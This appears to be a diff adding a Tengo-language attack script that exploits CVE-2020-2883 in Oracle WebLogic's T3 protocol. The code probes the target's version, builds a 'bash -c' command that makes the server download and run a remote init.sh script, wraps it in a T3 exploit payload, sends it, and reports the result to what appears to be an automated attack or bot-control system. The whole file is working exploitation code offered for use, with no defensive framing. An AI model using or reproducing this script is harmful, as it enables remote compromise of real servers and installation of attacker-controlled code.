@@ -1,0 +1,109 @@
+/*
+* This weblogic_t3.tengo is an attack script that attacks target host by weblogic t3 protocol bugs
+* CVE-2020-2883
+*
+*global variable:
+*attackTarget
+*attackScript
+*/
+
+fmt  := import("fmt")
+tcp := import("transport")
+text := import("text")
+attack := import("attack")
+
+WeblogicT3AttackName := "WeblogicT3AttackCVE2020_2883"
+WeblogicT3AttackType := "WeblogicT3AttackCVE2020_2883"
+AttackInitScriptName := "init.sh"
+CVE := "2020_2883"
+
+timeoutMS := 10000
+
+host := attackTarget.ip
+port := attackTarget.port
+proto := attackTarget.proto
+
+isSSL := (proto == "https" || proto == "t3s"||port==443)
+
+connection := tcp.newConnection("tcp",host,port,isSSL,timeoutMS,timeoutMS,timeoutMS)
+
+//make an attack cmd
+makeCmd := func(){
+
+    initUrl := attackScript.downloadInitUrl(host,port,AttackInitScriptName)
+    initDownloadCmd := attackScript.initCmdForLinux(initUrl,WeblogicT3AttackType)
+    cmd := fmt.sprintf("bash,-c,%s",initDownloadCmd)
+    return cmd
+}
+
+//make attack process and publish into attack tasks and send into sbot
+sendAttackResult := func(cmd,result) {
+
+    attackProcess := attack.newAttackProcess()
+    attackProcess.setIP(host)
+    attackProcess.setHost(host)
+    attackProcess.setPort(port)
+    attackProcess.setProto(isSSL?"t3s":"t3")
+    attackProcess.setApp("weblogic")
+    attackProcess.setName(WeblogicT3AttackName)
+    attackProcess.setType(WeblogicT3AttackType)
+    attackProcess.setStatus(0)
+    attackProcess.setPayload(cmd)
+    attackProcess.setResult(result)
+    attackProcess.setDetails(result)
+
+    //publish attack process into attack tasks
+    attackScript.pubProcess(attackProcess)
+}
+
+
+makeT3Header := func(){
+
+    proto := isSSL?"t3s":"t3"
+    return fmt.sprintf("%s 7.0.0.0\nAS:10\nHL:19\n\n",proto)
+}
+
+//get weblogic version
+sendHeader := func() {
+
+    header := makeT3Header()
+    //send header
+    connection.writeString(header)
+    connection.flush()
+    //read version
+    lversion := connection.readLineAsString()
+
+     if is_error(lversion)||lversion==""||!text.contains(lversion,"HELO:") {
+            return ""
+     }
+
+     s1 := text.replace(lversion,"HELO:","",-1)
+     s2 := text.replace(s1,"false","",-1)
+     s3 := text.replace(s2,"true","",-1)
+     s4 := text.replace(s2,"\n","",-1)
+     return text.replace(s4,".","",-1)
+}
+
+//send t3 attack payload
+main := func() {
+
+    //send weblogic header and get version
+    version := sendHeader()
+
+    if version!= "" {
+
+        cmd := makeCmd()
+        sendAttackResult(cmd,version)
+
+        //make attack payload
+        payload := attackScript.makeWeblogicT3Payload(cmd,version,CVE)
+
+        //send attack payload
+        connection.writeBytes(payload)
+        connection.flush()
+    }
+
+    connection.close()
+}
+
+main()
